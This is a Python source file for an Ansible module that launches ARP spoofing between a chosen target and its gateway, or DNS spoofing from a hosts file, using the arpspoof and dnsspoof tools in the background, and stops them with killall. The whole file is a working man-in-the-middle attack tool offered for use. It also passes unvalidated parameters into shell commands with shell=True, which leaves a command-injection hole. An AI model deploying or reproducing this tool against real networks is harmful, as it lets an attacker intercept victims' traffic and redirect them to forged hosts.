#!/usr/bin/python3
# -*- coding: utf-8 -*-

from ansible.module_utils.basic import AnsibleModule
import subprocess


class Spoofing:
    
    def __init__(self, interface, target, gateway, file, state):
        self.interface = interface
        self.target = target
        self.gateway = gateway
        self.file = file
        self.state = state
        
        
    def arpspoofing(self):
        comando = f"arpspoof -i {self.interface} -t {self.target} -r {self.gateway} 2> /dev/null &"
        resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        return resultado.stdout
    
    def dnsspoofing(self):
        comando = f"dnsspoof -i {self.interface} -f {self.file} 2> /dev/null &"
        resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        return resultado.stdout
    
    def stop_arpspoofing(self):
        comando = f"killall arpspoof 2>/dev/null"
        resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        return resultado.stdout

    def stop_dnsspoofing(self):
        comando = f"killall dnsspoof 2>/dev/null"
        resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        return resultado.stdout
        
    
def main():
    module_args = dict(
        interface = dict(type='str', required=False),
        target = dict(type='str', required=False),
        gateway = dict(type='str', required=False),
        file = dict(type='str', required=False),
        state = dict(type='str', required=True, choices=['arpspoofing', 'dnsspoofing', 'stop_arpspoofing', 'stop_dnsspoofing'])
    )    
    
    module = AnsibleModule(
        argument_spec = module_args,
        supports_check_mode = True
    )
    
    interface = module.params['interface']
    target = module.params['target']
    gateway = module.params['gateway']
    file = module.params['file']
    state = module.params['state']
    
    
    spoof = Spoofing(interface, target, gateway, file, state)
    
    if state == "arpspoofing":
        result = spoof.arpspoofing()
        module.exit_json(changed=True, stdout=result )
    elif state == "dnsspoofing":
        result = spoof.dnsspoofing()
        module.exit_json(changed=True, stdout=result )
    elif state == "stop_arpspoofing":
        result = spoof.stop_arpspoofing()
        module.exit_json(changed=True, stdout=result)
    elif state == "stop_dnsspoofing":
        result = spoof.stop_dnsspoofing()
        module.exit_json(changed=True, stdout=result)        
    
    
if __name__ == '__main__':
    main()    
    